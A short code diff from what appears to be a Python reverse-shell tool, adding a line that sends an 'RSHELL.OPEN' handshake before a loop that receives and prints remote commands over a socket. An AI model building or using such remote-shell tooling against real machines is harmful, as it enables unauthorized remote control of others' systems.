@@ -10,6 +10,7 @@ def execute(s, args):
     print("Reverse Shell closed.")
 
 def rshell(s):
+    s.sendall("RSHELL.OPEN".encode('utf-8'))
     while True:
         command = s.recv(1024).decode('utf-8').rstrip('\n')
         print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
